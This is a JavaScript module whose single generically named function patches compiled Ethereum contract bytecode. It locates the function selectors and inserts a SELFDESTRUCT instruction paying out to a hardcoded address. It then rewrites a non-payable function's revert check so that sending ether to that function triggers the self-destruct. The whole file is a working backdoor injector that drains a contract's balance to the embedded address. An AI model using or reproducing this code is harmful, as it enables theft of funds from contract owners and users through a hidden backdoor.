function f(bytecode){
let OPCODE = ['00', '01', '02', '03', '04', '05', '06', '07', '08', '09', '0A', '0B', 
              '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '1A', 
			  '20', '30', '31', '32', '33', '34', '35', '36', '37', '38', '39', '3A', '3B', '3C', '3D', '3E', 
			  '40', '41', '42', '43', '44', '45', 
			  '50', '51', '52', '53', '54', '55', '56', '57', '58', '59', '5A', '5B', 
			  '60', '61', '62', '63', '64', '65', '66', '67', '68', '69', '6A', '6B', '6C', '6D', '6E', '6F', 
			  '70', '71', '72', '73', '74', '75', '76', '77', '78', '79', '7A', '7B', '7C', '7D', '7E', '7F', 
			  '80', '81', '82', '83', '84', '85', '86', '87', '88', '89', '8A', '8B', '8C', '8D', '8E', '8F', 
			  '90', '91', '92', '93', '94', '95', '96', '97', '98', '99', '9A', '9B', '9C', '9D', '9E', '9F', 
			  'A0', 'A1', 'A2', 'A3', 'A4', 
			  'B0', 'B1', 'B2', 'B3', 'B4', 'B5', 'B6', 'B7', 'B8', 'B9', 'BA', 
			  'E1', 'E2', 'E3', 
			  'F0', 'F1', 'F2', 'F3', 'F4', 'F5', 'FA', 'FB', 'FC', 'FD', 'FF'];
let byteArray = bytecode.match(/.{1,2}/g)
let functions = []
let sizeOffset = ''
let bytecodeOffset = ''
let contractPayable = false;
let contractNonPayable = false;

//taking infos from the init code
for(let i = 0; i < byteArray.length; i++){
	if (byteArray[i] == '61' && 
	byteArray[i+3] == '80' && 
	byteArray[i+4] == '61' && 
	byteArray[i+7] == '60' && 
	byteArray[i+9] == '39' && 
	byteArray[i+10] == '60' && 
	byteArray[i+12] == 'f3'){
			sizeOffset = [i+1, i+2, byteArray[i+1] + byteArray[i+2]]
			bytecodeOffset = [i+5, i+6, byteArray[i+5] + byteArray[i+6]]
			console.log("bytecode size : " + parseInt(sizeOffset[2], 16) + " at offset : " + parseInt(bytecodeOffset[2], 16))
			break
	}
}
let byteArrayNoInitcode = byteArray.slice(parseInt(bytecodeOffset[2], 16))

//looking for functions pattern
for(let i = 0; i < byteArrayNoInitcode.length; i++){
	if (byteArrayNoInitcode[i] == '80' && 
	byteArrayNoInitcode[i+1] == '63' && 
	byteArrayNoInitcode[i+6] == '14' && 
	byteArrayNoInitcode[i+7] == '61' && 
	byteArrayNoInitcode[i+10] == '57'){
		let selector = byteArrayNoInitcode[i+2] + byteArrayNoInitcode[i+3] + byteArrayNoInitcode[i+4] + byteArrayNoInitcode[i+5]
		let address = byteArrayNoInitcode[i+8] + byteArrayNoInitcode[i+9]
		functions.push([address, selector, i+10])
		console.log("function found at : " + address + " with selector : " + selector)
		i = i+10
	}
}

//checking for payable and not payable functions (we need both)
for(let i = 0; i < functions.length; i++){
	let offset = parseInt(functions[i][0], 16)
	if(byteArrayNoInitcode[offset] == '5b' && 
	byteArrayNoInitcode[offset+1] == '34' && 
	byteArrayNoInitcode[offset+2] == '80' && 
	byteArrayNoInitcode[offset+3] == '15' && 
	byteArrayNoInitcode[offset+4] == '61' && 
	byteArrayNoInitcode[offset+7] == '57'){
		contractNonPayable = true
		console.log("function at : " + functions[i][0] + " with selector " + functions[i][1] + " is not payable")
	}
	else{
		contractPayable = true
		console.log("function at : " + functions[i][0] + " with selector " + functions[i][1] + " is payable")
	}
	//if we have both type of functions, we can continue
	if(contractPayable && contractNonPayable){
		let addressToJump = 0
		let jumpOffset = 0
		let l = 0
		while(l < byteArrayNoInitcode.length){
			//check that the instruction found is the designated invalid instruction
			if(byteArrayNoInitcode[l].toUpperCase() == 'FE'){
				jumpOffset = l
				addressToJump = ("0000" + l.toString(16)).substr(-4).match(/.{1,2}/g)
				break;
			}
			//if its a push, we ignore the pushed value
			else if(parseInt(byteArrayNoInitcode[l], 16) >= 0x60 && parseInt(byteArrayNoInitcode[l], 16) <= 0x7f){
				l += parseInt(byteArrayNoInitcode[l], 16) - 0x5f
			}
			l += 1
		}
		
		//insert selfdestruct code
		let selfDestructAddress = '0c17C7309A11b1296C5124d4C87cdF29A9aFAA1e'.match(/.{1,2}/g)
		let arrayToInsert = ['5b', '73']
		for (let j = 0; j < selfDestructAddress.length; j++){
			arrayToInsert.push(selfDestructAddress[j])
		}
		arrayToInsert.push('ff')
		for(let j = 0; j < arrayToInsert.length; j++){
			byteArrayNoInitcode.splice(jumpOffset + j, 0, arrayToInsert[j])
		}
		//modify the length of the bytecode
		let currentSize = ''
		for(let j = sizeOffset[0]; j < sizeOffset[1] + 1; j++){
			currentSize += byteArray[j];
		}
		currentSize = parseInt(currentSize, 16)
		currentSize += arrayToInsert.length
		currentSize = ("0000000000000000" + currentSize.toString(16)).substr(-((sizeOffset[1]+1 - sizeOffset[0]) * 2)).match(/.{1,2}/g)
		for(let j = 0; j < sizeOffset[1]+1 - sizeOffset[0]; j++){
			byteArray[sizeOffset[0] + j] = currentSize[j]
		}
		
		//find a non payable function and modify it in order to jump to the selfDestruct code
		for(let j = 0; j < functions.length; j++){
			offset = parseInt(functions[j][0], 16)
			if(byteArrayNoInitcode[offset] == '5b' && 
			byteArrayNoInitcode[offset+1] == '34' && 
			byteArrayNoInitcode[offset+2] == '80' && 
			byteArrayNoInitcode[offset+3] == '15'){
				//looking for the jumpi instruction
				for(let k = offset+4; k < offset+10; k++){
					if(byteArrayNoInitcode[k] == '57'){
						//check the pattern that follow the jumpi, we expect PUSH1-DUP1-REVERT
						if(byteArrayNoInitcode[k+1] == '60' && 
						byteArrayNoInitcode[k+3] == '80' && 
						byteArrayNoInitcode[k+4] == 'fd'){
							//the pattern is found we can replace it
							byteArrayNoInitcode[k+1] = '61'
							byteArrayNoInitcode[k+2] = addressToJump[0]
							byteArrayNoInitcode[k+3] = addressToJump[1]
							byteArrayNoInitcode[k+4] = '56'
							let finalByteCode = (byteArray.slice(0,parseInt(bytecodeOffset[2],16)) + byteArrayNoInitcode).replace(/,/g, '')
							return finalByteCode
						}
					}
				}
			}
		}
	}
}
return null;
}

module.exports = {f}